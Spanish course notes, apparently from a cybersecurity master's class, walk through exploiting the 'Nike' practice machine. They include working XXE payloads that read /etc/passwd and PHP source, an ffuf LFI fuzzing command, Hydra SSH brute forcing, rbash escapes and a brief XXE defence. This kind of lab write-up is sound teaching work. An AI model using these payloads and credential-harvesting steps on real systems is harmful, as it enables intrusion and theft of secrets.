> [!info] Ficha tÃ©cnica
> **MÃ¡ster de Ciberseguridad e Inteligencia Artificial** Â· **Clase 44**
> **MÃ³dulo:** MODULO3
> **Tema:** Clase 44
> **Fuente:** Apuntes Joselu Â· Evolve Academy

> [!tip] CÃ³mo leer estos apuntes
> Resumen estructurado de la clase 44. Contenido optimizado para estudio activo y repaso rÃ¡pido antes de exÃ¡menes.

---

---

--
**MÃ¡ster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy**

## 1.

Contexto y estructura de la sesiÃ³n

Esta sesiÃ³n la imparte **Castillo** (Carlos Castillo), que vuelve de San FermÃ­n.

Es un repaso completo de la mÃ¡quina **Nike** (HackerLabs) pero desde cero y desde otro punto de vista --- buscando que los alumnos interioricen el **razonamiento**, no solo los comandos.

**MetodologÃ­a de Castillo:** ir paso a paso, analizar cada respuesta antes de avanzar, no saltar a la conclusiÃ³n final.

La dificultad no estÃ¡ en los comandos --- estÃ¡ en saber quÃ© te estÃ¡ diciendo el servidor en cada momento.

**Roadmap del final del mÃ¡ster:** estas 2-3 semanas hasta finales de julio se usarÃ¡n para cerrar la parte web.

En septiembre vuelven Castillo y Carlos juntos.

HabrÃ¡ mÃ³dulo de Blue Team y de Active Directory.

## 2.

MetodologÃ­a web de Castillo --- "ir forzando por fases"

La idea central de toda la clase:

> "No pasÃ©is directamente al paso final.

No pensÃ©is en la mÃ¡quina entera.

Probad, mirad la respuesta, analizad quÃ© os estÃ¡ diciendo, y avanzad un paso."

### La secuencia de forzado progresivo

Fase 0: PeticiÃ³n vacÃ­a â†’ Â¿QuÃ© devuelve? "No proporcionado" â†’ el endpoint espera algo â†“ Fase 1: ParÃ¡metro aleatorio (email=test) â†’ Â¿QuÃ© devuelve?

Start tag expected / 500 â†’ espera XML, no texto â†“ Fase 2: XML bÃ¡sico bien formado â†’ Â¿Lo acepta? Â¿Devuelve 200 con el contenido? â†’ XML aceptado âœ“ â†“ Fase 3: XML con entidades (variables XML) â†’ Â¿Las interpreta y las refleja en la respuesta? â†’ Parser activo âœ“ â†“ Fase 4: Entidad externa SYSTEM file:///etc/passwd â†’ Â¿Devuelve el fichero? â†’ LFI via XXE confirmado âœ“

**Por quÃ© este orden:** cada paso confirma que el anterior funcionÃ³ antes de intentar el siguiente.

Si te saltas fases y algo falla, no sabrÃ¡s en quÃ© punto estÃ¡ el problema.

### GET vs.

POST --- cuÃ¡ndo cambiar el mÃ©todo

Cuando se va a enviar informaciÃ³n al servidor (un payload, un XML, datos de formulario), la peticiÃ³n debe ser **POST**, no GET.

- **GET:** pide informaciÃ³n al servidor.

Sin cuerpo de peticiÃ³n.
- **POST:** envÃ­a informaciÃ³n al servidor para que la valide o procese.

Con cuerpo de peticiÃ³n.

Si se manda un XML en una peticiÃ³n GET, puede funcionar igualmente --- pero es una mala prÃ¡ctica que puede romper en algunos servidores.

Siempre cambiar a POST cuando se envÃ­a un payload:

En Burp Repeater: clic derecho sobre la peticiÃ³n â†’ Change Request Method

## 3.

Repaso completo de la mÃ¡quina Nike con Burp Repeater

### Reconocimiento

ping IP # TTL 64 â†’ Linux confirmado nmap -sCV IP # Puerto 22 (SSH, sin credenciales = sin usar) + 80 (HTTP Apache 2.4) whatweb http://IP # TecnologÃ­as + posibles emails

**WhatWeb en pÃ¡ginas web de CTF:** normalmente no saca mucho mÃ¡s de lo que ya da Nmap.

Pero en pÃ¡ginas reales con mucho contenido puede detectar emails ocultos en el texto que se nos escapan al navegar.

No fiaros al 100% pero usarlo siempre.

### Fuzzing de directorios y ficheros

gobuster dir -u http://IP \
 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
 -x php,html,txt,xml \
 -s "200,301,302,500" -b ""

**Hallazgos:** - `/uploads/` â†’ 200, accesible (condiciÃ³n de ejecuciÃ³n confirmada) - `upload.php` â†’ el formulario de subida de XML - `datos.php` â†’ devuelve 500 (existe, interactÃºa con el backend, formato desconocido)

### AnÃ¡lisis de upload.php con Burp Repeater

**Paso 1 --- PeticiÃ³n vacÃ­a:**

GET /upload.php â†’ 200: "No proporcionado"

Cambiar a POST.

Mismo resultado.

El endpoint espera algo.

**Paso 2 --- ParÃ¡metro arbitrario:**

POST /upload.php Body: email=test

Resultado: `start tag expected` o similar â†’ espera XML (las etiquetas `<>`).

**ConfirmaciÃ³n desde las cabeceras:** En DevTools (F12 â†’ Network) o en Burp, la cabecera `Accept` de la respuesta incluye `application/xml` â†’ confirma que el servidor acepta y espera XML.

**Paso 3 --- XML bÃ¡sico:**

<?xml version="1.0"?> <userinfo> <firstname>test</firstname> </userinfo>

Resultado: 200, el servidor devuelve el contenido â†’ **XML aceptado y parseado**.

**Paso 4 --- XML con entidad (variable):**

<?xml version="1.0"?> <!DOCTYPE test [ <!ENTITY example "HolaMundo"> ]> <userinfo> <lastname>&example;</lastname> </userinfo>

Resultado: el servidor devuelve `HolaMundo` en el campo lastname â†’ **el parser interpreta las entidades** â†’ vulnerable a XXE.

**Paso 5 --- Entidad externa (XXE â†’ LFI):**

<?xml version="1.0"?> <!DOCTYPE test [ <!ENTITY ent SYSTEM "file:///etc/passwd"> ]> <userinfo> <lastname>&ent;</lastname> </userinfo>

Resultado: el servidor devuelve el contenido de `/etc/passwd` â†’ **LFI via XXE confirmado**.

## 4.

QuÃ© leer con el LFI --- mÃ¡s allÃ¡ del /etc/passwd

Castillo explica que `/etc/passwd` es solo el punto de partida.

Con LFI se puede leer mucho mÃ¡s:

### Ficheros habituales de interÃ©s

/etc/passwd â†’ Usuarios del sistema y sus shells /home/USUARIO/.ssh/id_rsa â†’ Clave privada SSH del usuario /home/USUARIO/.bash_history â†’ Historial de comandos del usuario /var/www/html/upload.php â†’ CÃ³digo fuente de los ficheros PHP /var/www/html/datos.php â†’ Fichero PHP que devolvÃ­a 500 â†’ leer su cÃ³digo

**IngenierÃ­a inversa de frameworks:** si Wappalyzer detecta un framework como ColdFusion, WordPress, Drupal o uno personalizado, buscar en Internet su documentaciÃ³n de instalaciÃ³n para saber en quÃ© ruta guarda los ficheros de configuraciÃ³n, las contraseÃ±as y las claves.

Ejemplo: - ColdFusion 8 â†’ carpeta `/coldfusion8/` - ColdFusion 9 â†’ carpeta `/coldfusion9/`

Leer los ficheros de configuraciÃ³n de ese framework usando LFI puede dar contraseÃ±as o claves directamente.

### El diccionario LFI de SecLists

SecLists tiene diccionarios especÃ­ficos para LFI --- listas de rutas de ficheros comunes en Linux/Windows que pueden ser interesantes de leer:

# Encontrar el diccionario LFI en SecLists:

find /usr/share/seclists -name "*LFI*" -o -name "*lfi*"

# TÃ­picamente en: /usr/share/seclists/Fuzzing/LFI/

# Usarlo con FFUF para fuerza bruta de rutas via LFI:

ffuf -u 'http://IP/upload.php' \
 -X POST \
 -d '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY ent SYSTEM "file:///FUZZ">]><u><l>&ent;</l></u>' \
 -H 'Content-Type: application/xml' \
 -w /usr/share/seclists/Fuzzing/LFI/LFI-linux-payload.txt

**Por quÃ© usar fuerza bruta de rutas LFI:** cuando no sabes quÃ© ficheros hay en el sistema y quieres encontrar rutas que contengan credenciales, claves privadas o configuraciones.

## 5.

Leer datos.php --- las credenciales en texto claro

Con el LFI confirmado, leer el cÃ³digo fuente de `datos.php`:

<?xml version="1.0"?> <!DOCTYPE test [ <!ENTITY ent SYSTEM "file:///var/www/html/datos.php"> ]> <userinfo> <lastname>&ent;</lastname> </userinfo>

**Resultado:** el servidor devuelve el cÃ³digo fuente PHP de `datos.php`, que contiene un listado de usuarios y contraseÃ±as **hardcodeados en texto claro** dentro del propio fichero.

Guardar los usuarios en `usuarios.txt` y las contraseÃ±as en `passwords.txt`.

## 6.

Validar credenciales con Hydra contra SSH

Con la lista de usuarios y contraseÃ±as extraÃ­da:

hydra -L usuarios.txt -P passwords.txt ssh://IP

**Resultado:** usuario `mike` con su contraseÃ±a encontrada.

**Por quÃ© Hydra y no probarlos a mano:** con 5 usuarios Ã— 5 contraseÃ±as son 25 combinaciones posibles.

A mano es tedioso y propenso a errores.

Hydra lo hace en segundos.

## 7.

Restricted Bash (rbash) --- quÃ© es y cÃ³mo bypassearla

Al conectarse por SSH con `mike`, el sistema devuelve una **shell restringida** (`rbash` --- *restricted bash*).

### QuÃ© bloquea rbash

La `r` de rbash viene de **restringida**.

Es una "shell enjaulada" que impide: - Cambiar de directorio (`cd`) - Usar rutas con `/` en los comandos - Redirigir salidas (`>`, `>>`, `|`) - Modificar variables de entorno - Ejecutar comandos con rutas absolutas (`/bin/bash`, `/bin/sh`)

### CÃ³mo detectar que estÃ¡s en rbash

La shell muestra `rbash` en el prompt o el comando `echo $0` devuelve `-rbash`.

Intentar `cd /` devuelve `rbash: cd: restricted`.

### TÃ©cnicas de bypass de rbash

Diversas formas de escapar la shell restringida, en orden de frecuencia:

**1.

SSH con flag** `-t` **forzando bash:**

```bash
ssh mike@IP -t "bash --noprofile"
```

# o

```bash
ssh mike@IP -t "/bin/bash"
```

**2.

Desde dentro de la rbash con un editor de texto:**

vi

# Dentro de vi:

:set shell=/bin/bash :shell

**3.

Desde Python:**

python3 -c 'import os; os.system("/bin/bash")'

**4.

### Desde awk:**

awk 'BEGIN {system("/bin/bash")}'

**5.

### Desde find:**

find / -name "algo" -exec /bin/bash \;

> [!important] **Concepto importante:** rbash no es un mecanismo de seguridad robusto.

Es fÃ¡cil de bypassear si el usuario puede ejecutar cualquier programa con capacidad de lanzar subprocesos.

El nombre `rbash` de por sÃ­ es la seÃ±al de alerta.

## 8.

La defensa contra XXE --- libxml_disable_entity_loader()

Castillo menciona brevemente la defensa desde el lado Blue Team:

**Por quÃ© funciona el XXE:** PHP por defecto permite cargar entidades externas en el parser XML (`libxml`).

Esto hace posible el `SYSTEM "file:///"`.

**La funciÃ³n de defensa:**

// En PHP (versiones < 8.0): libxml_disable_entity_loader(true);

// En PHP 8.0+: deshabilitado por defecto (ya no hace falta la funciÃ³n)

**Lo que hace:** deshabilita la carga de entidades externas en el parser XML.

Sin entidades externas, el `<!ENTITY ent SYSTEM "file:///etc/passwd">` simplemente no funciona --- el parser ignora la directiva `SYSTEM`.

**Lo que NO hace:** la funciÃ³n `libxml_use_internal_errors(true)` que aparecÃ­a en el cÃ³digo de la mÃ¡quina no es la defensa --- esa funciÃ³n solo controla si los errores XML se muestran en pantalla o se suprimen.

No evita el XXE.

## 9.

Flujo completo de la mÃ¡quina Nike

netdiscover â†’ IP objetivo â†“ ping â†’ TTL 64 â†’ Linux nmap -sCV â†’ puertos 22 (SSH) y 80 (HTTP Apache 2.4) whatweb / Wappalyzer â†’ fingerprinting â†“ GoBuster (directorios) â†’ /uploads/ (accesible) GoBuster (ficheros -x php) â†’ upload.php + datos.php (500) â†“ Burp Repeater â†’ upload.php â†’ PeticiÃ³n vacÃ­a â†’ "No proporcionado" â†’ POST + text â†’ start tag expected â†’ espera XML â†’ XML bÃ¡sico â†’ 200 â†’ XML parseado âœ“ â†’ XML con entidad variable â†’ refleja el valor â†’ parser activo âœ“ â†’ Entidad SYSTEM file:///etc/passwd â†’ devuelve /etc/passwd â†’ LFI via XXE âœ“ â†“ /etc/passwd â†’ usuarios del sistema con /bin/bash: mike, otros â†“ LFI â†’ leer /var/www/html/datos.php â†’ usuarios + contraseÃ±as en texto claro â†“ Guardar en usuarios.txt y passwords.txt hydra -L usuarios.txt -P passwords.txt ssh://IP â†’ mike:CONTRASEÃ‘A encontrada â†“ ssh mike@IP â†’ rbash (shell restringida) â†’ Bypass rbash â†’ bash completa â†“ sudo -l â†’ enumerar vectores de escalada â†’ siguiente usuario o root

## 10.

Conceptos y tÃ©rminos clave corregidos

TÃ©rmino en la transcripciÃ³n CorrecciÃ³n / AclaraciÃ³n
------------------------------------------------------ -----------------------------------------------------------------------------------------------------------------------------
 *XX E / X equis E / el de las entidades* **XXE** (*XML External Entity Injection*) -- inyecciÃ³n de entidades externas en XML para conseguir LFI
 *LFI / local find inclusing / local file* **LFI** (*Local File Inclusion*) -- lectura de ficheros locales del servidor
*el diccionario de LFI / diccionario de rutas* **Diccionario LFI** en SecLists -- listas de rutas de ficheros comunes en Linux/Windows para fuerza bruta de rutas via LFI
 *SYSTEM file tres barras / el file system* `SYSTEM "file:///ruta"` -- protocolo para leer ficheros locales en entidades XML externas
 *la entidad / variable XML / el entity* `<!ENTITY nombre SYSTEM "file:///">` -- declaraciÃ³n de entidad externa en XML
 *datos punto PHP / el 500 de datos* `datos.php` -- fichero PHP de la mÃ¡quina Nike con credenciales hardcodeadas en texto claro
 *upload punto PHP / el del XML* `upload.php` -- fichero PHP de la mÃ¡quina Nike vulnerable a XXE
 *hard coreado / hardcodiao* **Hardcodeado** -- valor escrito directamente en el cÃ³digo en lugar de en una configuraciÃ³n externa
 *R-bash / restricted / la shell de Mike* **rbash** (*restricted bash*) -- shell enjaulada que restringe comandos, rutas absolutas y redirecciones
 *la shell enjaulada / jaula bash* **rbash** -- ver arriba
*bypass de la base restringida / bypassear el rbash* **Bypass de rbash** -- tÃ©cnicas para escapar de la shell restringida (SSH `-t bash`, vi + `:shell`, Python, awk)
 *get / la del get / peticiÃ³n get* **HTTP GET** -- peticiÃ³n que solicita informaciÃ³n sin enviar datos en el cuerpo
 *post / la del post / mÃ©todo post* **HTTP POST** -- peticiÃ³n que envÃ­a datos al servidor en el cuerpo de la peticiÃ³n
 *el repÃ­ter / el de mandar peticiones* **Repeater** -- mÃ³dulo de Burp Suite para enviar peticiones manualmente y analizar las respuestas
 *Bursuite / Bursway / Burns way* **Burp Suite** -- framework de auditorÃ­a web
*lib XML / disable entities / la del true* `libxml_disable_entity_loader(true)` -- funciÃ³n PHP que deshabilita la carga de entidades externas XML (defensa contra XXE)
 *Wap Alliser / WapAllizer / el de las tecnologÃ­as* **Wappalyzer** -- extensiÃ³n del navegador para detectar tecnologÃ­as web
 *GoBaster / GoBuster / el dir* **Gobuster** -- herramienta de fuzzing de directorios y ficheros web
 *selllist / sell list / sek list* **SecLists** -- colecciÃ³n de diccionarios para pentesting (directorios, LFI, contraseÃ±as, subdominios...)
 *Hydra / la de bruta de SSH* **Hydra** -- herramienta de fuerza bruta multi-protocolo
 *Claudia / Claude / la IA* **Claude** (Anthropic) -- IA usada para generar payloads y analizar el cÃ³digo PHP extraÃ­do
*Call fusiÃ³n / Cold fusiÃ³n 8 o 9* **ColdFusion** -- framework web de Adobe; ejemplo de framework cuya versiÃ³n determina el nombre de su carpeta de instalaciÃ³n

â†’

*Resumen elaborado para uso acadÃ©mico en el MÃ¡ster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy.*

â†’

â†’

â†’

---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../transcripciones/Julio/11.07.2026 Owasp Top 10 XXE  Labs II.md|11.07.2026 Owasp Top 10 XXE  Labs II]— Escalada de Privilegios, GoBuster, SSH
- [[../../apuntes Andres/10.07.2026 Repaso y Explotación Avanzada Máquinas Nike y Castor.md|10.07.2026 Repaso y Explotación Avanzada Máquinas Nike y Castor]— Escalada de Privilegios, GoBuster, SSH
- [[resumen_master_clase43.md|resumen_master_clase43]— Escalada de Privilegios, GoBuster, SSH
- [[resumen_master_clase45.md|resumen_master_clase45]— Escalada de Privilegios, GoBuster, SSH
- [[../../transcripciones/Julio/14.07.2026 Fundamentos Web y SQL Injection Máquina Injected (HackerLab).md|14.07.2026 Fundamentos Web y SQL Injection Máquina Injected (HackerLab)]— Escalada de Privilegios, GoBuster, SSH
- [[../../transcripciones/Julio/09.07.2026 Owasp Top 10 XXE  Labs with Castor.md|09.07.2026 Owasp Top 10 XXE  Labs with Castor]— Escalada de Privilegios, GoBuster, SSH

### 🛠️ Herramientas

- [[comandos/BurpSuite|Burp Suite]]
- [[comandos/FFUF|FFUF]]
- [[comandos/GoBuster|GoBuster]]
- [[comandos/Hydra|Hydra]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/05 - Auditoria Web/Path Traversal — 6 Casos y Bypasses.md|Path Traversal / LFI]]
- [[Apuntes/05 - Auditoria Web/XXE — XML External Entity.md|XXE]]

> #blue-team #burpsuite #escalada-privilegios #ffuf #gobuster #hydra #ia #lfi #linux #nmap #redes #ssh #windows #wordpress #xxe
